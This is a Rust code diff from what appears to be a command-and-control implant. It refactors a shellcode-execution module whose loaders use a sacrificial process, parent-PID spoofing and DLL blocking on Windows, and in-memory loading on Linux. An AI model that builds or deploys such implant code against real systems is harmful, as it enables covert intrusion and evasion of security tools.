@@ -1,7 +1,7 @@
 #![allow(unused_assignments)]
 use crate::{check_request, Module, Result, TaskResult};
 use async_trait::async_trait;
-use malefic_helper::common::format_cmdline;
+use malefic_helper::common::utils::format_cmdline;
 use malefic_helper::to_error;
 use malefic_proto::proto::implantpb::spite::Body;
 use malefic_proto::proto::modulepb::BinaryResponse;
@@ -39,17 +39,18 @@ impl Module for ExecuteShellcode {
             }
             #[cfg(target_os = "windows")]
             {
-                ret = to_error!(malefic_helper::win::loader::apc::loader(
+                ret = to_error!(malefic_helper::win::loader::loader(
                     bin,
                     is_need_sacrifice,
                     cmdline.as_ptr() as _,
                     ppid,
-                    is_block_dll
+                    is_block_dll,
+                    request.output
                 ))?;
             }
             #[cfg(target_os = "linux")]
             {
-                ret = to_error!(malefic_helper::linux::loader::memfd::loader(
+                ret = to_error!(malefic_helper::linux::loader::loader(
                     bin,
                     request.output
                 ))?;
